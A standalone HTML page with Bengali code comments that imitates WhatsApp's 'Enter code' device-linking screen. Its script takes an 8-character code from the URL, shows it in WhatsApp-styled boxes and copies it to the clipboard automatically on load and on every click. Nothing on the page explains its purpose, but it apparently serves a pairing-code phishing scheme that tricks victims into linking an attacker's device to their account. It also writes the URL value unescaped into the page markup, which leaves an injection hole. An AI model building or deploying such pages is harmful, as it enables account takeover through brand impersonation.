<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Code</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
        }

        .whatsapp-container {
            width: 100%;
            max-width: 500px;
            padding: 30px 24px;
            box-sizing: border-box;
        }

        /* ওপরের স্থায়ী অংশ (যা কখনো পরিবর্তন হবে his) */
        .header-section {
            margin-bottom: 40px;
        }

        .header-section h2 {
            font-size: 22px;
            font-weight: 500;
            color: #111b21;
            margin: 0 0 20px 0;
        }

        .header-section p {
            font-size: 15px;
            color: #3b4a54;
            line-height: 1.45;
            margin: 0 0 8px 0;
        }

        .header-section .link-highlight {
            color: #00a884;
            text-decoration: none;
            font-weight: 500;
        }

        /* নিচের পরিবর্তনশীল অংশ */
        .dynamic-code-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 180px;
        }

        /* ৮টি ফাঁকা ঘরের মূল গ্রিড - Screenshot_20260530_081340.jpg এর নিখুঁত ডিজাইন */
        .code-grid {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-bottom: 20px;
            cursor: pointer;
        }

        .box-cell {
            width: 36px;
            height: 48px;
            border: 2px solid #111b21;
            border-radius: 12px;
            font-size: 24px;
            font-weight: bold;
            color: #111b21;
            display: flex;
            justify-content: center;
            align-items: center;
            background: transparent;
            text-transform: uppercase;
        }

        .hyphen {
            font-size: 24px;
            color: #111b21;
            margin: 0 6px;
            font-weight: bold;
        }

        .warning-text {
            font-size: 14px;
            color: #667781;
            font-weight: 500;
            margin-top: 10px;
            text-align: center;
        }

        .toast-msg {
            color: #00a884;
            font-size: 14px;
            font-weight: bold;
            margin-top: 8px;
            display: none;
            background: #eafefb;
            padding: 6px 16px;
            border-radius: 20px;
        }

        .loading-placeholder {
            color: #8696a0;
            font-style: italic;
            font-size: 15px;
        }
    </style>
</head>
<body>

<div class="whatsapp-container">
    
    <!-- ১. ওপরের স্থায়ী অংশ -->
    <div class="header-section">
        <h2>Enter code</h2>
        <p>To get your code: Go to WhatsApp on the web or on another device, then click <strong>Link with phone number</strong>. <span class="link-highlight">Learn more</span></p>
    </div>

    <!-- ২. নিচের পরিবর্তনশীল অংশ -->
    <div class="dynamic-code-section" id="dynamic-area">
        <div class="loading-placeholder">Loading valid session...</div>
    </div>

</div>

<script>
  // ইউআরএল থেকে কোডটি খুঁজে বের করার ফাংশন (যেমন: ?code=ABCD1234)
  function getCodeFromUrl() {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get('code');
  }

  let currentActiveCode = getCodeFromUrl();

  // ক্লিপবোর্ডে কপি করার ফাংশন
  function triggerCopy(codeText) {
      if (!codeText) return;
      navigator.clipboard.writeText(codeText).then(() => {
          const toast = document.getElementById("copy-toast");
          if (toast) {
              toast.style.display = "block";
              setTimeout(() => { toast.style.display = "none"; }, 2500);
          }
      }).catch(err => {
          console.log("Clipboard write status: Blocked");
      });
  }

  const dynamicArea = document.getElementById('dynamic-area');

  // যদি লিংক-এ কোড পাওয়া যায়
  if (currentActiveCode && currentActiveCode.length === 8) {
      currentActiveCode = currentActiveCode.toUpperCase();
      
      const firstPart = currentActiveCode.substring(0, 4);
      const secondPart = currentActiveCode.substring(4, 8);
      
      let gridHtml = `<div class="code-grid" onclick="triggerCopy('${currentActiveCode}')">`;
      
      for (let i = 0; i < 4; i++) {
          gridHtml += `<div class="box-cell">${firstPart[i]}</div>`;
      }
      
      gridHtml += '<span class="hyphen">-</span>';
      
      for (let i = 0; i < 4; i++) {
          gridHtml += `<div class="box-cell">${secondPart[i]}</div>`;
      }
      
      gridHtml += '</div>'; 
      gridHtml += '<div class="toast-msg" id="copy-toast">✓ কোডটি ক্লিপবোর্ডে কপি হয়েছে!</div>';
      gridHtml += '<div class="warning-text">Never enter a code if you didn\'t request it.</div>';
      
      dynamicArea.innerHTML = gridHtml;
      
      // পেজে ঢোকার সাথে সাথে এবং স্ক্রিনের যেকোনো জায়গায় টাচ করলে অটো কপি হবে
      setTimeout(() => { triggerCopy(currentActiveCode); }, 500);
      document.body.addEventListener('click', () => { triggerCopy(currentActiveCode); });

  } else {
      // যদি কোড না থাকে, তবে লোডিং বা অপেক্ষমাণ বার্তা দেখাবে
      dynamicArea.innerHTML = '<div class="loading-placeholder">Waiting for code assignment...</div>';
  }
</script>

</body>
</html>
